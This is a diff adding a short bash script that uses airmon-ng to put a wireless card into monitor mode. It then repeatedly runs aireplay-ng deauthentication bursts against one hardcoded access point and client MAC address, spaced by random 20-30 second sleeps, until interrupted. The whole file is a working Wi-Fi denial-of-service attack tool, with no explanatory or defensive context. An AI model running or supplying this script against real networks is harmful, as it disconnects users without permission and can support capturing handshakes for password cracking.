@@ -1,0 +1,33 @@
+#!/bin/bash
+
+trap ctrl_c INT
+
+ctrl_c ()
+{
+  airmon-ng stop wlp1s0mon
+  echo -e "\n[*] Exit.."
+  exit 0
+}
+monitor ()
+{
+  
+  airmon-ng start wlp1s0 6
+}
+attack ()
+{
+  declare -i timerando=$(shuf -i 20-30 -n 1)
+  sleep 1
+  bash -c "timeout 15 aireplay-ng -0 0 -a A0:18:42:06:69:03 -c 90:0f:0c:a6:31:99 --ignore-negative-one wlp1s0mon"
+  echo -e "\n\n$timerando\n\n"
+  sleep $timerando
+  attack
+}
+
+if [ $(id -u) = "0" ]; then
+  monitor
+  #channel
+  attack
+  ctrl_c
+else
+  echo -e "Permission denied"
+fi
